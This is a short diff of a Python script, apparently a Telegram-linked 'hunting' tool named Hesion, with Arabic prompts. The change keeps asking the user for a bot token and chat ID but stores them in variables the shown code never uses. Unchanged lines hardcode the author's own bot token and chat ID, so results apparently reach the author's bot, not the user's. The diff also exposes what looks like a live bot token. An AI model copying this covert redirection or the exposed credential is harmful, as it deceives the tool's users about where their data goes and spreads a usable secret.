@@ -87,14 +87,12 @@ except:
 output = render('Hesion ', colors=['white', 'red'], align='center')
 print(output)
 print('')
-print('\x1b[1;32m ادخل توكن بوتك')
-token = input('\x1b[1;32m𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧 : ')
-print('')
-print('\x1b[1;32m ادخل ايدي بوتك')
-ID = input('\x1b[1;32m𝐄𝐧𝐭𝐞𝐫 𝐈𝐃  : ')
+token1 = input(' TOKEN : ')
+
+ID1 = input(' ID : ')
 
 
-rd = requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(ID) + '&text= ❖ تم تشغيل اداة حسيون بنجاح\n ❖ - تم تشغيل البوت بنجاح \n ❖ - انتضر الصيد يوصل هون علبوت \n ❖ - دز صور صيد @lIIHII ').text
+
 token = '6328700769:AAHrNfIQKh-plN1qPIhoM63tSTSNDfHMPtw'
 print('\n')
 ID = '5825578407'
